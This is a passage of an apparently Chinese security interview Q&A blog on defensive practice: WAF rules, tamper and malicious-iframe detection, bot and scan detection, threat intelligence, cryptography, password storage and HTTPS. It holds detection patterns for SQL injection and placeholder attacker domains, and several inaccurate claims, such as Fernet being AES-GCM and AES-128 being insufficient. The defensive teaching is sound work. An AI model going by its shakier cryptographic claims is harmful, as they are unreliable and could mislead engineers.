<li><strong>WAF 规则</strong>：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (<span class="variable">$query_string</span> <span class="regexp">~ &quot;union.*select&quot;)</span> &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><strong>数据库安全策略</strong>：<ul>
<li>采用 <strong>参数化查询</strong>，避免拼接 SQL：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">&quot;SELECT * FROM users WHERE id = %s&quot;</span>, (user_id,))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h3 id="如何实现页面篡改感知？"><a href="#如何实现页面篡改感知？" class="headerlink" title="如何实现页面篡改感知？"></a><strong>如何实现页面篡改感知？</strong></h3><p><strong>检测方法</strong>：</p>
<ol>
<li><strong>定期对比页面哈希值</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">md5sum</span> index.html</span><br></pre></td></tr></table></figure></li>
<li><strong>启用 Content Security Policy（CSP）</strong>：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Content-Security-Policy <span class="string">&quot;default-src &#x27;self&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure></li>
<li><strong>利用 <code>Selenium</code> 监测页面 DOM 变化</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_xpath(<span class="string">&quot;//script[contains(text(),&#x27;malicious&#x27;)]&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="如何实现页面挂马感知？"><a href="#如何实现页面挂马感知？" class="headerlink" title="如何实现页面挂马感知？"></a><strong>如何实现页面挂马感知？</strong></h3><p><strong>挂马检测方式</strong>：</p>
<ol>
<li><strong>定期扫描 <code>script</code> 标签，发现异常 URL</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;&lt;script src=&quot;</span> /var/www/html/index.html</span><br></pre></td></tr></table></figure></li>
<li><strong>检测恶意 <code>iframe</code> 注入</strong>：<ul>
<li>监测 <code>&lt;iframe&gt;</code> 指向未知域名：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html_content, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> iframe <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;iframe&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;attack.com&quot;</span> <span class="keyword">in</span> iframe[<span class="string">&#x27;src&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Malicious iframe detected!&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何确保线上拦截规则不出现误拦截？"><a href="#如何确保线上拦截规则不出现误拦截？" class="headerlink" title="如何确保线上拦截规则不出现误拦截？"></a><strong>如何确保线上拦截规则不出现误拦截？</strong></h3><p><strong>误拦截分析</strong>：</p>
<ol>
<li><strong>回放拦截日志</strong>，分析被拦截请求：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/nginx/access.log | grep <span class="string">&quot;403&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>灰度测试</strong>：<ul>
<li>先在 <strong>镜像流量环境</strong> 中测试规则，确保不会影响正常流量。</li>
</ul>
</li>
<li><strong>结合 AI 风控</strong>：<ul>
<li>通过 <strong>异常分数计算</strong> 识别误报：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> IsolationForest</span><br><span class="line">model = IsolationForest()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何识别公共和私有接口？"><a href="#如何识别公共和私有接口？" class="headerlink" title="如何识别公共和私有接口？"></a><strong>如何识别公共和私有接口？</strong></h3><ol>
<li><strong>根据 API 路由模式</strong>：<ul>
<li><code>/api/public/</code> 可能为公共接口。</li>
<li><code>/admin/</code> 可能为私有接口。</li>
</ul>
</li>
<li><strong>基于鉴权检测</strong>：<ul>
<li>发送请求，无 Token 仍返回 200，则可能为公共接口。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何识别机器行为请求？"><a href="#如何识别机器行为请求？" class="headerlink" title="如何识别机器行为请求？"></a><strong>如何识别机器行为请求？</strong></h3><p><strong>机器请求特征</strong>：</p>
<ol>
<li><strong>User-Agent 异常</strong>：<ul>
<li>爬虫通常使用 <code>curl</code>、<code>Python-requests</code>。</li>
</ul>
</li>
<li><strong>请求频率异常</strong>：<ul>
<li>短时间内大量请求：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> /var/log/nginx/access.log | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>行为模式异常</strong>：<ul>
<li>正常用户不会 <strong>连续点击多个页面</strong>。</li>
</ul>
</li>
</ol>
<p><strong>检测方式</strong>：</p>
<ul>
<li>结合 <strong>CAPTCHA</strong> 进行验证。</li>
<li>采用 <strong>行为指纹分析</strong>（鼠标轨迹、人机交互）。</li>
</ul>
<hr>
<h3 id="如何感知被动风险？"><a href="#如何感知被动风险？" class="headerlink" title="如何感知被动风险？"></a><strong>如何感知被动风险？</strong></h3><ol>
<li><strong>监测被动 DNS</strong>：<ul>
<li>发现是否有恶意域名解析：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;badsite.com&quot;</span> /var/log/dnsmasq.log</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>流量侧感知</strong>：<ul>
<li>被动分析流量，检测 C2 通信：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bro -r capture.pcap</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>威胁情报关联</strong>：<ul>
<li>结合 <code>Threat Intelligence</code>，匹配恶意 IP 访问日志。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何判断攻击请求是定点攻击还是随机扫描？"><a href="#如何判断攻击请求是定点攻击还是随机扫描？" class="headerlink" title="如何判断攻击请求是定点攻击还是随机扫描？"></a><strong>如何判断攻击请求是定点攻击还是随机扫描？</strong></h3><p><strong>定点攻击</strong>：</p>
<ul>
<li>针对 <strong>特定 URL</strong>，如 <code>/admin/login</code>，长期攻击同一接口。</li>
<li>目标明确，通常伴随 <strong>密码爆破</strong> 或 <strong>业务滥用</strong>。</li>
</ul>
<p><strong>随机扫描</strong>：</p>
<ul>
<li>短时间内访问多个 URL，类似 <code>dirb</code>、<code>gobuster</code> 行为：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;404&quot;</span> /var/log/nginx/access.log | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br></pre></td></tr></table></figure></li>
<li>目标模糊，尝试 <strong>路径遍历、子域名爆破</strong>。</li>
</ul>
<hr>
<h3 id="如何识别客户端的系统真实类型？"><a href="#如何识别客户端的系统真实类型？" class="headerlink" title="如何识别客户端的系统真实类型？"></a><strong>如何识别客户端的系统真实类型？</strong></h3><h2 id="检测方法：1-基于-User-Agent-：-2-JS-指纹识别：-通过-navigator-platform-获取系统类型：-3-TLS-指纹分析：-通过-JA3-识别系统特征："><a href="#检测方法：1-基于-User-Agent-：-2-JS-指纹识别：-通过-navigator-platform-获取系统类型：-3-TLS-指纹分析：-通过-JA3-识别系统特征：" class="headerlink" title="检测方法：1. **基于 User-Agent**：   2. JS 指纹识别：   - 通过 navigator.platform 获取系统类型：     3. TLS 指纹分析：   - 通过 JA3 识别系统特征：     "></a><strong>检测方法</strong>：<br>1. **基于 <code>User-Agent</code>**：<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Windows NT&quot;</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure><br>2. <strong>JS 指纹识别</strong>：<br>   - 通过 <code>navigator.platform</code> 获取系统类型：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(navigator.<span class="property">platform</span>);</span><br></pre></td></tr></table></figure><br>3. <strong>TLS 指纹分析</strong>：<br>   - 通过 <strong>JA3</strong> 识别系统特征：<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ja3 -r capture.pcap</span><br></pre></td></tr></table></figure></h2><h3 id="有哪些可以收集的情报渠道？"><a href="#有哪些可以收集的情报渠道？" class="headerlink" title="有哪些可以收集的情报渠道？"></a><strong>有哪些可以收集的情报渠道？</strong></h3><p><strong>威胁情报来源</strong>：</p>
<ol>
<li><strong>开源情报（OSINT）</strong>：<ul>
<li><code>Shodan</code>、<code>Censys</code> 发现暴露的企业资产。</li>
<li><code>Twitter</code>、<code>Telegram</code> 监控黑客讨论。</li>
</ul>
</li>
<li><strong>商业情报</strong>：<ul>
<li>订阅 <code>Recorded Future</code>、<code>CrowdStrike</code> 提供的情报数据。</li>
</ul>
</li>
<li><strong>暗网情报</strong>：<ul>
<li>监控 <code>Tor</code>、<code>I2P</code> 发现泄露数据。</li>
</ul>
</li>
<li><strong>蜜罐数据</strong>：<ul>
<li>通过 <code>Cowrie</code> 捕获攻击者行为，分析 C2 服务器地址。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何快速筛选出最新的-CVE-对我们是否有实际影响？"><a href="#如何快速筛选出最新的-CVE-对我们是否有实际影响？" class="headerlink" title="如何快速筛选出最新的 CVE 对我们是否有实际影响？"></a><strong>如何快速筛选出最新的 CVE 对我们是否有实际影响？</strong></h3><p><strong>筛选步骤</strong>：</p>
<ol>
<li><strong>解析 CVE 影响范围</strong>：<ul>
<li>关注 <code>CWE</code> 分类（如 <code>CWE-79</code> 代表 XSS）。</li>
</ul>
</li>
<li><strong>比对自身资产</strong>：<ul>
<li>检查企业内部使用的软件版本：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep openssl</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>PoC 复现测试</strong>：<ul>
<li>运行 <code>Exploit-DB</code> 或 <code>Metasploit</code> 进行验证：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit CVE-2024-1234</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h3 id="给定一个网址，如何自动化识别其是否为钓鱼网站？"><a href="#给定一个网址，如何自动化识别其是否为钓鱼网站？" class="headerlink" title="给定一个网址，如何自动化识别其是否为钓鱼网站？"></a><strong>给定一个网址，如何自动化识别其是否为钓鱼网站？</strong></h3><p><strong>识别步骤</strong>：</p>
<ol>
<li><strong>域名相似性分析</strong>：<ul>
<li>计算 <code>Levenshtein 距离</code>，检测是否模仿官方域名：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fuzzywuzzy <span class="keyword">import</span> fuzz</span><br><span class="line">fuzz.ratio(<span class="string">&quot;paypa1.com&quot;</span>, <span class="string">&quot;paypal.com&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>证书分析</strong>：<ul>
<li>检测 HTTPS 证书签发方，钓鱼站常使用 <code>Let&#39;s Encrypt</code> 证书。</li>
</ul>
</li>
<li><strong>页面内容特征</strong>：<ul>
<li>使用 <code>Selenium</code> 获取网站截图，与官方站点比对 UI 相似度。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何识别仿冒-APP？"><a href="#如何识别仿冒-APP？" class="headerlink" title="如何识别仿冒 APP？"></a><strong>如何识别仿冒 APP？</strong></h3><p><strong>检测方法</strong>：</p>
<ol>
<li><strong>签名校验</strong>：<ul>
<li>通过 <code>apksigner</code> 检测 APK 签名：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apksigner verify --print-certs fake_app.apk</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>动态行为分析</strong>：<ul>
<li>使用 <code>Frida</code> Hook API，检测是否存在异常权限请求：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line">session = frida.get_usb_device().attach(<span class="string">&quot;fake_app&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>市场监控</strong>：<ul>
<li>在 <code>Google Play</code>、<code>第三方应用商店</code> 监控相似 APP。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何识别一个没有登陆的用户真实身份？"><a href="#如何识别一个没有登陆的用户真实身份？" class="headerlink" title="如何识别一个没有登陆的用户真实身份？"></a><strong>如何识别一个没有登陆的用户真实身份？</strong></h3><p><strong>识别方法</strong>：</p>
<ol>
<li><strong>基于指纹识别</strong>：<ul>
<li>采集浏览器 <code>Canvas Fingerprint</code>、<code>User-Agent</code> 等特征。</li>
</ul>
</li>
<li><strong>基于行为分析</strong>：<ul>
<li>监测鼠标移动轨迹，AI 识别人类 vs 机器人：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">clientX</span>, e.<span class="property">clientY</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>IP 地址溯源</strong>：<ul>
<li>使用 <code>MaxMind</code> 库识别用户 IP 归属地。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何找出对我们业务实施网络攻击的黑客真实身份？"><a href="#如何找出对我们业务实施网络攻击的黑客真实身份？" class="headerlink" title="如何找出对我们业务实施网络攻击的黑客真实身份？"></a><strong>如何找出对我们业务实施网络攻击的黑客真实身份？</strong></h3><p><strong>溯源方法</strong>：</p>
<ol>
<li><strong>IP 反查</strong>：<ul>
<li>通过 <code>whois</code> 查询攻击者 IP 归属：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois &lt;attacker_ip&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>蜜罐捕获</strong>：<ul>
<li>使用 <code>T-Pot</code> 蜜罐收集攻击者行为模式。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="国内和国外攻击特点有什么区别？"><a href="#国内和国外攻击特点有什么区别？" class="headerlink" title="国内和国外攻击特点有什么区别？"></a><strong>国内和国外攻击特点有什么区别？</strong></h3><table>
<thead>
<tr>
<th><strong>对比项</strong></th>
<th><strong>国内攻击</strong></th>
<th><strong>国外攻击</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>攻击手法</strong></td>
<td>业务滥用、供应链攻击</td>
<td>APT、高级恶意软件</td>
</tr>
<tr>
<td><strong>工具</strong></td>
<td>国内木马、Cobalt Strike</td>
<td>Metasploit、Empire</td>
</tr>
<tr>
<td><strong>目标</strong></td>
<td>金融、电商、政企系统</td>
<td>基础设施、政府机构</td>
</tr>
<tr>
<td><strong>攻击目的</strong></td>
<td>经济利益、数据窃取</td>
<td>国家级间谍活动</td>
</tr>
<tr>
<td><strong>攻击溯源</strong></td>
<td>攻击 IP 多变，难溯源</td>
<td>APT 组织痕迹明显</td>
</tr>
</tbody></table>
<p><strong>总结</strong>：</p>
<ul>
<li><strong>国内攻击者</strong> 偏向于经济驱动型（如诈骗、钓鱼、撞库）。</li>
<li><strong>国外 APT 组织</strong> 更倾向于 <strong>长期潜伏</strong>，目标往往是 <strong>情报窃取</strong>。</li>
</ul>
<hr>
<h3 id="常见加解密分类和算法有哪些？"><a href="#常见加解密分类和算法有哪些？" class="headerlink" title="常见加解密分类和算法有哪些？"></a><strong>常见加解密分类和算法有哪些？</strong></h3><table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>国际算法</strong></th>
<th><strong>国密算法</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>对称加密</strong></td>
<td>AES、DES</td>
<td>SM4</td>
</tr>
<tr>
<td><strong>非对称加密</strong></td>
<td>RSA、ECDSA、ECDH</td>
<td>SM2</td>
</tr>
<tr>
<td><strong>消息摘要算法</strong></td>
<td>SHA256、MD5</td>
<td>SM3</td>
</tr>
<tr>
<td><strong>传输层安全协议</strong></td>
<td>TLS、SSL</td>
<td>TLS1.3 + 国密单证书</td>
</tr>
<tr>
<td><strong>国密证书</strong></td>
<td>sha*WithRsaEncryption</td>
<td>SM2-with-SM3</td>
</tr>
</tbody></table>
<hr>
<h3 id="哪些-Hash-和加密算法不建议使用？"><a href="#哪些-Hash-和加密算法不建议使用？" class="headerlink" title="哪些 Hash 和加密算法不建议使用？"></a><strong>哪些 Hash 和加密算法不建议使用？</strong></h3><p><strong>不建议使用的算法</strong>：</p>
<ol>
<li><p><strong>已被破解</strong>：</p>
<ul>
<li><strong>MD5</strong>（碰撞攻击已被实现）</li>
<li><strong>SHA1</strong>（已存在实用级攻击）</li>
<li><strong>RC4</strong>（TLS 已弃用）</li>
<li><strong>DES</strong>（密钥长度过短）</li>
</ul>
</li>
<li><p><strong>安全性不足</strong>：</p>
<ul>
<li><strong>3DES</strong>（密钥长度 168-bit，但攻击复杂度已降低）</li>
<li><strong>RSA 1024-bit</strong>（建议使用 2048-bit 或以上）</li>
<li><strong>AES 128-bit</strong>（可使用 AES-256 提高安全性）</li>
</ul>
</li>
</ol>
<p><strong>推荐使用的算法</strong>：</p>
<ul>
<li><strong>对称加密</strong>：AES-256</li>
<li><strong>非对称加密</strong>：RSA-4096、ECC（如 Curve25519）</li>
<li><strong>Hash 算法</strong>：SHA-256 及以上</li>
</ul>
<hr>
<h3 id="硬编码密钥如何解决？"><a href="#硬编码密钥如何解决？" class="headerlink" title="硬编码密钥如何解决？"></a><strong>硬编码密钥如何解决？</strong></h3><p><strong>风险</strong>：</p>
<ul>
<li>硬编码密钥会被代码审计工具（如 <code>GitLeaks</code>、<code>TruffleHog</code>）检测并泄露。</li>
</ul>
<p><strong>解决方案</strong>：</p>
<ol>
<li><strong>环境变量存储密钥</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> API_KEY=<span class="string">&quot;your-secret-key&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>使用 KMS（密钥管理系统）</strong>：<ul>
<li>AWS KMS、HashiCorp Vault 进行密钥管理</li>
</ul>
</li>
<li><strong>定期轮换密钥</strong>：<ul>
<li>避免长期使用同一密钥，降低泄露风险。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="PKI-原理"><a href="#PKI-原理" class="headerlink" title="PKI 原理"></a><strong>PKI 原理</strong></h3><p><strong>PKI（公钥基础设施）工作机制</strong>：</p>
<ol>
<li><strong>密钥对</strong>：每个用户有 <strong>公钥 + 私钥</strong>（RSA&#x2F;ECC）。</li>
<li><strong>证书</strong>：由 <strong>CA（证书颁发机构）</strong> 签发，确保公钥可信。</li>
<li><strong>证书链</strong>：通过 <strong>根 CA -&gt; 中间 CA -&gt; 服务器证书</strong> 形成信任链。</li>
</ol>
<p><strong>应用场景</strong>：</p>
<ul>
<li><strong>SSL&#x2F;TLS</strong> 证书认证（HTTPS）</li>
<li><strong>数字签名</strong> 确保数据完整性</li>
</ul>
<hr>
<h3 id="国密的底层原理？"><a href="#国密的底层原理？" class="headerlink" title="国密的底层原理？"></a><strong>国密的底层原理？</strong></h3><p><strong>国密算法（SM 系列）特点</strong>：</p>
<ol>
<li><strong>SM2（非对称加密）</strong>：<ul>
<li>替代 RSA，基于椭圆曲线，密钥长度更短但更安全。</li>
</ul>
</li>
<li><strong>SM3（哈希算法）</strong>：<ul>
<li>替代 SHA256，提供更高抗碰撞性。</li>
</ul>
</li>
<li><strong>SM4（对称加密）</strong>：<ul>
<li>替代 AES，适用于数据加密。</li>
</ul>
</li>
</ol>
<p><strong>应用场景</strong>：</p>
<ul>
<li><strong>政府、金融机构</strong> 需符合国密标准（如 TLS1.3 + SM2 证书）。</li>
</ul>
<hr>
<h3 id="密码如何保存至数据库？"><a href="#密码如何保存至数据库？" class="headerlink" title="密码如何保存至数据库？"></a><strong>密码如何保存至数据库？</strong></h3><p><strong>最佳实践</strong>：</p>
<ol>
<li><strong>使用 PBKDF2 进行哈希</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, os</span><br><span class="line">salt = os.urandom(<span class="number">16</span>)</span><br><span class="line">password_hash = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, password.encode(), salt, <span class="number">100000</span>)</span><br></pre></td></tr></table></figure></li>
<li><strong>使用 bcrypt&#x2F;scrypt 加密</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcrypt <span class="keyword">import</span> hashpw, gensalt</span><br><span class="line">hashed_password = hashpw(password.encode(), gensalt())</span><br></pre></td></tr></table></figure></li>
<li><strong>避免明文存储</strong>：<ul>
<li><strong>禁止使用 MD5、SHA1 直接存储</strong>。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何让密码轮转？"><a href="#如何让密码轮转？" class="headerlink" title="如何让密码轮转？"></a><strong>如何让密码轮转？</strong></h3><p><strong>密码轮转策略</strong>：</p>
<ol>
<li><strong>定期更换密钥</strong>：<ul>
<li>采用 <strong>密钥版本控制</strong>，新密码使用新密钥加密：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl enc -aes-256-cbc -e -<span class="keyword">in</span> file.txt -out file.enc -K NEW_KEY</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>双重存储机制</strong>：<ul>
<li><strong>新密码 + 旧密码并存</strong>，避免一次性全量更新：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store_password(user_id, new_hash, old_hash)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>自动化管理</strong>：<ul>
<li>使用 <strong>KMS（密钥管理系统）</strong> 进行密钥生命周期管理。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="可以在哪些层次对文件进行加密？"><a href="#可以在哪些层次对文件进行加密？" class="headerlink" title="可以在哪些层次对文件进行加密？"></a><strong>可以在哪些层次对文件进行加密？</strong></h3><p><strong>加密层次</strong>：</p>
<ol>
<li><strong>应用层加密</strong>：<ul>
<li>采用 <code>AES-GCM</code> 加密文件：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line">key = Fernet.generate_key()</span><br><span class="line">cipher = Fernet(key)</span><br><span class="line">encrypted_data = cipher.encrypt(<span class="string">b&quot;secret data&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>文件系统加密</strong>：<ul>
<li>Linux <code>eCryptfs</code>，Windows <code>BitLocker</code></li>
</ul>
</li>
<li><strong>磁盘级加密</strong>：<ul>
<li>通过 <code>LUKS</code> 加密整个磁盘：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cryptsetup luksFormat /dev/sdX</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何技术手段实现全站-HTTPS？"><a href="#如何技术手段实现全站-HTTPS？" class="headerlink" title="如何技术手段实现全站 HTTPS？"></a><strong>如何技术手段实现全站 HTTPS？</strong></h3><p><strong>全站 HTTPS 方案</strong>：</p>
<ol>
<li><strong>申请 TLS 证书</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certbot --nginx -d example.com</span><br></pre></td></tr></table></figure></li>
<li><strong>强制跳转 HTTPS</strong>（Nginx 配置）：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><strong>启用 HSTS（HTTP Strict Transport Security）</strong>：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubDomains&quot;</span> always;</span><br></pre></td></tr></table></figure></li>
<li><strong>升级不安全请求</strong>：<ul>
<li>使用 <code>Content-Security-Policy</code>：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Content-Security-Policy <span class="string">&quot;upgrade-insecure-requests&quot;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>检测 HTTPS 配置安全性</strong>：<ul>
<li>使用 <code>Qualys SSL Labs</code> 测试：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I https://www.ssllabs.com/ssltest/analyze.html?d=example.com</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h2 id="安全蓝军"><a href="#安全蓝军" class="headerlink" title="安全蓝军"></a>安全蓝军</h2><h3 id="如何通过程序判断一批域名是否泛解析域名？"><a href="#如何通过程序判断一批域名是否泛解析域名？" class="headerlink" title="如何通过程序判断一批域名是否泛解析域名？"></a><strong>如何通过程序判断一批域名是否泛解析域名？</strong></h3><p><strong>泛解析检测方法</strong>：</p>
<ol>
<li><strong>查询一个不存在的子域名</strong>：<ul>
<li>例如 <code>random-subdomain.example.com</code>，如果返回 IP，则说明存在泛解析。</li>
</ul>
</li>
<li><strong>比对返回 IP</strong>：<ul>
<li>解析多个子域名，若 IP 一致，可能为泛解析。</li>
</ul>
</li>
</ol>
<h2 id="Python-实现："><a href="#Python-实现：" class="headerlink" title="Python 实现："></a><strong>Python 实现</strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_wildcard</span>(<span class="params">domain</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        test_subdomain = <span class="string">f&quot;random-test.<span class="subst">&#123;domain&#125;</span>&quot;</span></span><br><span class="line">        answer = dns.resolver.resolve(test_subdomain, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> answer.rrset <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>  <span class="comment"># 有解析结果，则为泛解析</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">domain_list = [<span class="string">&quot;example.com&quot;</span>, <span class="string">&quot;wildcard.example.com&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> domain <span class="keyword">in</span> domain_list:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;domain&#125;</span>: <span class="subst">&#123;<span 